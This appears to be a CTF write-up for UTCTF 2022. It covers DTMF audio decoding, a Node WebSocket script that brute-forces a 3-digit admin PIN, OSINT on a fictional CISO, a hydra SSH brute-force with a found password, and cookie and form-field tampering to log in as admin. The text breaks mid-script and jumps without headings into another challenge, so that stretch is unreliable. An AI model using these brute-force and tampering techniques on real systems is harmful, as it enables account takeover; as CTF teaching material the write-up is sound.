### Sounds Familiar

> You have one new message. Main menu. To listen to your messages press 1. By Aly (Prince_Ali#9152 on discord)

Attached is a single file, `sounds_strange.wav`. Listening to the audio in Audacity, it very clearly sounds like the beeps a phone makes when it is dialed.

{{< image src="/img/CTFs/2022/utctf2022/sounds_strange.png" alt="sounds_strange.png" position="center" style="border-radius: 8px;" >}}

This is not really a new concept; many CTFs have had a similar sort of challenge, so the trick on this one I had was figuring out what to do once you had the dialed digits.

To get the list of numbers, all you need is a [DTMF](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling) tone detector/capturer. For this, I used [this new online site that I haven't seen or used before by unframework](https://unframework.github.io/dtmf-detect/#/) (I previously used [linux-dtmf](https://github.com/nedobylskiy/linux-dtmf) which had also worked well). The online site was accurate and really nice, though I wish the numbers stayed on the screen after it's been fully decoded (you had to be quick to copy+paste the final result, otherwise it clears itself after a few seconds).

Running the `.wav` file in that site yields the following digits:

{{< highlight text >}}
100888210610071905578878610699109864888508912081681081029071571029810957488812286111817274108102816161
{{< /highlight >}}

At first, I couldn't figure out what these were, since the full set of digits didn't really make any sort of sense when decoded using anything I tried. 

After a while, I realized they were punching the digits in in groups separated by silence, and thought about splitting the digits based on input (visible in the audacity pic above). Doing so yields a set of numbers that look suspiciously like a valid set of ASCII values:

{{< highlight text >}}
100 88 82 106 100 71 90 55 78 87 86 106 99 109 86 48 88 50 89 120 81 68 108 102 90 71 57 102 98 109 57 48 88 122 86 111 81 72 74 108 102 81 61 61
{{< /highlight >}}

[Converting these to ASCII yields a base64 string, which when decoded, gives the flag](https://discord.com/channels/824804925800316929/952001668373970954/952358801267384360).

Or, without CyberChef:

{{< highlight bash >}}
for digit in 100 88 82 106 100 71 90 55 78 87 86 106 99 109 86 48 88 50 89 120 81 68 108 102 90 71 57 102 98 109 57 48 88 122 86 111 81 72 74 108 102 81 61 61; do printf \\$(printf '%03o' $digit); done | base64 -d
utctf{5ecret_f1@9_do_not_5h@re}
{{< /highlight >}}

Flag is `utctf{5ecret_f1@9_do_not_5h@re}`.

## Web

### Websockets?

> Can you hack my website?
>
> By Daniel Parks (@danielp on discord)

Navigating to the website, the home page is so:

{{< image src="/img/CTFs/2022/utctf2022/websockets_home.png" alt="websockets_home" position="center" style="border-radius: 8px;" >}}

Navigating to the login page, it looks like a pretty simple page:

{{< image src="/img/CTFs/2022/utctf2022/websockets_login_home.png" alt="websockets_login_home" position="center" style="border-radius: 8px;" >}}

Trying a few common things, we notice a bit of information disclosure/leakage in the form of username leakage. Entering a username that doesn't exist we get an error message that the username doesn't exist in the system:

{{< image src="/img/CTFs/2022/utctf2022/websockets_login_baduser.png" alt="websockets_bad_user" position="center" style="border-radius: 8px;" >}}

But if we guess the correct user, we are shown a different message, leaking the usernames in the system:

{{< image src="/img/CTFs/2022/utctf2022/websockets_login_badpw.png" alt="websockets_badpw" position="center" style="border-radius: 8px;" >}}

So we know the username is **admin**. Looking at the page source, we can see the login logic is so:

```html
<div class="topbox">
	<h1>Login</h1>
	<span class="error"></span>
	<form method="post">
		<input name="username" type="text" placeholder="Username" required>
		<!-- what is this garbage, you ask? Well, most of our pins are now 16 digits, but we still have some old 3-digit pins left because tom is a moron and can't remember jack -->
		<input name="password" type="password" placeholder="PIN" required pattern="(\d{3}|\d{16})">
		<input type="submit">
	</form>
	<script src="/static/login.js"></script>
</div>
```

We can assume the password pin is going to be 3 digits (`\d{3}`), since 16 would be not feasible to brute force for a CTF:)

We also can see the source for the login JS itself:

```js
document.querySelector("input[type=submit]").addEventListener("click", checkPassword);

function checkPassword(evt) {
	evt.preventDefault();
	const socket = new WebSocket("ws://" + window.location.host + "/internal/ws")
	socket.addEventListener('message', (event) => {
		if (event.data == "begin") {
			socket.send("begin");
			socket.send("user " + document.querySelector("input[name=username]").value)
			socket.send("pass " + document.querySelector("input[name=password]").value)
		} else if (event.data == "baduser") {
			document.querySelector(".error").innerHTML = "Unknown user";
			socket.close()
		} else if (event.data == "badpass") {
			document.querySelector(".error").innerHTML = "Incorrect PIN";
			socket.close()
		} else if (event.data.startsWith("session ")) {
			document.cookie = "flask-session=" + event.data.replace("session ", "") + ";";
			socket.send("goodbye")
			socket.close()
			window.location = "/internal/user";
		} else {
			document.querySelector(".error").innerHTML = "Unknown error";
			socket.close()
		}
	})
}
```

Now we see why the challenge is called _Websockets?_. The login function above is creating a Websocket to the challenge URL (which, when we look at it in browser is stored in the `window.location.host` value), and submitting our POST'ed forms username and password.

So, the task is clear: using username `admin`, brute force all possible 3-digit pins. Once logged in, we'll probably have the flag.

The problem I had with this challenge was finding how to actually send the data to the websocket. Not being a web solver usually, the tools I would default to (`curl`, etc) didn't work since it's sending data to the websocket instead of the host directly. I tried [a few things on SO](https://unix.stackexchange.com/questions/432940/how-do-you-send-data-to-a-web-socket-using-curl) (`websocat`, a specially crafted set of headers for cURL, etc) but none seemed to work. 

I ended up just modified the given `login.js` above to do the simply bruteforcing, and run it with `node`.

First, make sure you have `ws` installed (which provides the `WebSocket` package).

{{< highlight js >}}
const WebSocket = require('ws');

pins = ["000","001","002","003","004","005","006","007","008","009","010","011","012","013","014","015","016","017","018","019","020","021","022","023","024","025","026","027","028","029","030","031","032","033","034","035","036","037","038","039","040","041","042","043","044","045","046","047","048","049","050","051","052","053","054","055","056","057","058","059","060","061","062","063","064","065","066","067","068","069","070","071","072","073","074","075","076","077","078","079","080","081","082","083","084","085","086","087","088","089","090","091","092","093","094","095","096","097","098","099","100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","121","122","123","124","125","126","127","128","129","130","131","132","133","134","135","136","137","138","139","140","141","142","143","144","145","146","147","148","149","150","151","152","153","154","155","156","157","158","159","160","161","162","163","164","165","166","167","168","169","170","171","172","173","174","175","176","177","178","179","180","181","182","183","184","185","186","187","188","189","190","191","192","193","194","195","196","197","198","199","200","201","202","203","204","205","206","207","208","209","210","211","212","213","214","215","216","217","218","219","220","221","222","223","224","225","226","227","228","229","230","231","232","233","234","235","236","237","238","239","240","241","242","243","244","245","246","247","248","249","250","251","252","253","254","255","256","257","258","259","260","261","262","263","264","265","266","267","268","269","270","271","272","273","274","275","276","277","278","279","280","281","282","283","284","285","286","287","288","289","290","291","292","293","294","295","296","297","298","299","300","301","302","303","304","305","306","307","308","309","310","311","312","313","314","315","316","317","318","319","320","321","322","323","324","325","326","327","328","329","330","331","332","333","334","335","336","337","338","339","340","341","342","343","344","345","346","347","348","349","350","351","352","353","354","355","356","357","358","359","360","361","362","363","364","365","366","367","368","369","370","371","372","373","374","375","376","377","378","379","380","381","382","383","384","385","386","387","388","389","390","391","392","393","394","395","396","397","398","399","400","401","402","403","404","405","406","407","408","409","410","411","412","413","414","415","416","417","418","419","420","421","422","423","424","425","426","427","428","429","430","431","432","433","434","435","436","437","438","439","440","441","442","443","444","445","446","447","448","449","450","451","452","453","454","455","456","457","458","459","460","461","462","463","464","465","466","467","468","469","470","471","472","473","474","475","476","477","478","479","480","481","482","483","484","485","486","487","488","489","490","491","492","493","494","495","496","497","498","499","500","501","502","503","504","505","506","507","508","509","510","511","512","513","514","515","516","517","518","519","520","521","522","523","524","525","526","527","528","529","530","531","532","533","534","535","536","537","538","539","540","541","542","543","544","545","546","547","548","549","550","551","552","553","554","555","556","557","558","559","560","561","562","563","564","565","566","567","568","569","570","571","572","573","574","575","576","577","578","579","580","581","582","583","584","585","586","587","588","589","590","591","592","593","594","595","596","597","598","599","600","601","602","603","604","605","606","607","608","609","610","611","612","613","614","615","616","617","618","619","620","621","622","623","624","625","626","627","628","629","630","631","632","633","634","635","636","637","638","639","640","641","642","643","644","645","646","647","648","649","650","651","652","653","654","655","656","657","658","659","660","661","662","663","664","665","666","667","668","669","670","671","672","673","674","675","676","677","678","679","680","681","682","683","684","685","686","687","688","689","690","691","692","693","694","695","696","697","698","699","700","701","702","703","704","705","706","707","708","709","710","711","712","713","714","715","716","717","718","719","720","721","722","723","724","725","726","727","728","729","730","731","732","733","734","735","736","737","738","739","740","741","742","743","744","745","746","747","748","749","750","751","752","753","754","755","756","757","758","759","760","761","762","763","764","765","766","767","768","769","770","771","772","773","774","775","776","777","778","779","780","781","782","783","784","785","786","787","788","789","790","791","792","793","794","795","796","797","798","799","800","801","802","803","804","805","806","807","808","809","810","811","812","813","814","815","816","817","818","819","820","821","822","823","824","825","826","827","828","829","830","831","832","

Saving the above to `login.js` and running with `node login.js`, we find the pin:

```text
node login.js

Found pin:
907
flask-session=eyJ0eXAiOiJKV1QiLC...
```

Logging in with `admin:907`, we get the flag:

{{< image src="/img/CTFs/2022/utctf2022/websockets_flag.png" alt="websockets_flag" position="center" style="border-radius: 8px;" >}}

Flag is `utflag{w3bsock3ts}`.

If you look closely at the background, we see what looks like the flag as item 3, which when submitted, is accepted.

Flag is `utflag{situational_awareness_is_key}`.

Continuing on from Public Panic PT1, we know the following Twitter web (by inspecting+following the original team's followers and links):

* [Neil Cline](https://twitter.com/NeilCline9)
* [Britt Bryant](https://twitter.com/BrittBryant18)
* [Robyn Swanson](https://twitter.com/RobynSwanson96)
* [Sherman Kern](https://twitter.com/kern_sherman)
* [Craig Wallace](https://twitter.com/CraigWa09526548)
* [Wade Coldwater](https://twitter.com/WadeColdwater)
* [Claude Castillo](https://twitter.com/ClaudeCastill18)

* [Misty Booker](https://twitter.com/MistyBooker99)
* [Debby Uselton](https://twitter.com/DebbyUselton)
* [Cliff Shackleford](https://twitter.com/CliffShacklefo1)

From the challenge prompt, we have a new target, which "we're allowed to enumerate". Let's do so:

```text
nmap -sV misc2.utctf.live -p 8622                                                                                        Desktop
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 12:53 EDT
Nmap scan report for misc2.utctf.live (18.205.162.101)
Host is up (0.025s latency).
rDNS record for 18.205.162.101: ec2-18-205-162-101.compute-1.amazonaws.com

PORT     STATE SERVICE VERSION
8622/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
```

So it looks like we need to find SSH creds to log on to this server at port 8622. From the list of twitter accounts above, it happens that in the same tweet/image from the first problem, we also see what looks to be a potential SSH password:

{{< image src="/img/CTFs/2022/utctf2022/wade_board.png" alt="wade_board" position="center" style="border-radius: 8px;" >}}

In item 2, "defaultpw5678!" looks like our SSH password. All that's left is to figure out what username to use. This is the part of the challenge that took me the longest. I manually tried various combinations of twitter handles/names/etc. After about 30 minutes, I got sick of that and started making a list of permutations that I would throw at the service with `hydra` (the brute forcing SSH tool). 

I asked the challenge author first if this was OK, and they said "Have at it! Feel free to use a script or hydra against this one.". So hydra it is:)

After failing to crack the login with my intial list of usernames based on twitter handles, I tried various combinations of FirstnameLastname, LastnameFirstname, FirstnameLastname(3 chars), etc. None of which worked. After a few hours and suggestions of the author, "common username conventions might help", I decided to look into more standard unix username conventions. 

[One of the first Google hits](https://serverfault.com/questions/348912/best-practices-in-username-standards-avoiding-problems) seemed to mention that **{firstInitial}{lastname}** was the way.

Using this convention with the list of users above yields the following account list:

```text
wcoldwater
ccastillo
cshackleford
duselton
sjaggers
mbooker
ncline
skern
rswanson
bbryant
cwallace
```

... which we can then feed to hydra with our password, to brute force the service:

```bash
hydra -t 2 -L accounts.txt -p defaultpw5678! ssh://misc2.utctf.live:8622
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-13 13:02:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 2 tasks per 1 server, overall 2 tasks, 11 login tries (l:11/p:1), ~6 tries per task

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-13 13:03:15
```

Boom, we have the login! `[8622][ssh] host: misc2.utctf.live   login: cshackleford   password: defaultpw5678!` tells us we can login with `cshackleford` and the password.

Doing so gets us the flag:

```bash
ssh -p 8622 cshackleford@misc2.utctf.live
cshackleford@misc2.utctf.live's password:
# ...
cshackleford@3e64db1cbff7:~$ cat flag.txt
utflag{conventions_knowledge_for_the_win}
```

Flag is `utflag{conventions_knowledge_for_the_win}`.

### Osint Full

So this one looks to be full blown OSINT. All we're given is "EddKing6", a supposed username. 

Doing a duckduckgo search for specifically that term (i.e searching for "EddKing6", with quotes) [yields a frew interesting results](https://duckduckgo.com/?q=%22eddking6%22&atb=v247-1&ia=web):

* [Edd King Github profile](https://github.com/eddking6)
* [Edd King Twitter](https://twitter.com/eddking6)
* [Edd King github repo "DogFeedScheduler"](https://github.com/eddking6/DogFeedScheduler)

Looking at his Github profile:

{{< image src="/img/CTFs/2022/utctf2022/eddking_git.png" alt="eddking_git" position="center" style="border-radius: 8px;" >}}

His bio has one of the challenge's answers:

> His favorite food?: "I love walking my dog and eating **Cacio e Pepe**."

Checking the DogFeedScheduler repo, we see the [most recent commit was for "added email functionality"](https://github.com/eddking6/DogFeedScheduler/commit/e76f938adc53997b4ed9769e2b1e103793f0b4ea).

In that commit, we see the following code block:


``` go {linenos=true,linenostart=15}
func sendmail(srv gmail.Service, frommail string) {
	temp := []byte("From: 'me'\r\n" +
		"reply-to: blobcorpciso@gmail.com\r\n" +
		"To:  blobcorpciso@gmail.com\r\n" +
		"Subject: Feed Spot \r\n" +
		"remember to feed spot")
```

From this blob, we can see two more answers:

> His Email?: **blobcorpciso@gmail.com**
> The name of his dog?: **spot**

There isn't much more in the Github repo that I saw, so now to check his [Twitter](https://twitter.com/eddking6). His bio states:

> I like hacking things and running blob corp

So, we know he works at a "blob corp". Searching through his small tweet history, the [following tweet](https://twitter.com/eddking6/status/1498113770652065798?s=20&t=vYcOibKHA3cJZxztwKHTrA) reveals two more answers:

> eddking6: I like to play FactorIO when I'm not busy being a #CISO

So:

> His favourite video game?: **FactorIO**
> His Role at his company?: **CISO**

All that's left is his Alma Matter. Given we know his company and role, I imagine we need to search for them on LinkedIn. Searching "eddking linkedin ciso blob corp" yields a [eddking6](https://www.linkedin.com/in/eddking6/) linkedin page, which is indeed our man. In his education, we see the final answer.

> His alma matter?: **Texas A&M University**.

Now all we have to do is "... send him a carefully crafted phishing email including all the details."

I figured we didn't have to actually craft a phising email or anything like that, given how many solves the challenge had, and other problem difficulties. Instead, I figured they'd be doing some sort of regex matching/searching on the messages contents, so I just made sure to re-use all the spelling/capitlization of the previous answers and send an email to the `blobcorpciso@gmail.com` email. The body of my email:

```text
Find out the following information about EddKing6

The name of his dog? spot

His favourite video game? FactorIO

His alma mater?  Texas A&M University

His Role at his company? CISO

His favorite food? Cacio e Pepe

His Email? blobcorpciso@gmail.com
```

In about 10 seconds, I got an email back:

{{< image src="/img/CTFs/2022/utctf2022/email.png" alt="email" position="center" style="border-radius: 8px;" >}}

Flag is `utflag{osint_is_fun}`.


## Beginner


### Login as Admin Pt 1

Note: These writeups are purposefully short. Each problem had a hint that made the problem trivial to solve.

> HQ needs you to help them gain admin access to the Web D-EVIL-opers' site. We think the developers were a bunch of lazy bozos and just set the username and password to 'admin' but that doesn't seem to work. Can you see if we're missing anything?

> FYI, you do not need to do the Login as Admin sequence in order, and later parts are not necessarily harder than earlier ones.

Login authentication was gated by a cookie named `isAdmin` that was being set to `False`. Simply intercept the request (using Burpsuite proxy, for example) and update the cookie to be True.

### Login as Admin Pt 2

Note: These writeups are purposefully short. Each problem had a hint that made the problem trivial to solve.

> The boys back at HQ need you again! The Web D-EVIL-opers have changed their login page a bit, but we suspect the admin username and password are STILL set to admin. We're having trouble submitting the credentials, though. Can you help us out?
>

> http://web1.utctf.live:2362

This time, we're _given_ the login creds: `admin:admin`. However, when visiting the site, the login button appears grayed out. Using HTML inspect in a browser, you can see the button's relevant code:

```html
        <input type="submit" id="submitButton" value="Log In" disabled>
```

If you edit that source to just delete the `disabled` keyword and then enter the credentials, you will login and get the flag.


### Login as Admin Pt 3

Note: These writeups are purposefully short. Each problem had a hint that made the problem trivial to solve.

> Ok sorry but just one more time. HQ really needs your help. These Web D-EVIL-opers keep changing their site and preventing us from logging in. It seems the one thing they won't change is their username and password *rolls eyes*. Can you figure out how to log in?

Again, we know the credentials are `admin:admin`. However, upon sending those creds, we get a 400 bad request error.

Inspecting the given source code:


```go {linenos=true}
from flask import *
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == "admin" and request.form['pwd'] == "admin" and request.form['isAdmin'] == "True":
            with open('flag.txt', 'r') as file:
                flag = file.read()
            return make_response("Hello Admin! The flag is " + flag), 200
        else:
            return render_template('index.html', loginFailed=True)
    else:
        return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

We see on line 7 that the site is expecting `isAdmin` to be set as a form field. By default, the `isAdmin` value is a cookie, and we are only sending `username` and `pwd` in the form data. Adding `&isAdmin=True` to the data (by intercepting the request with say burpproxy) you get the flag.
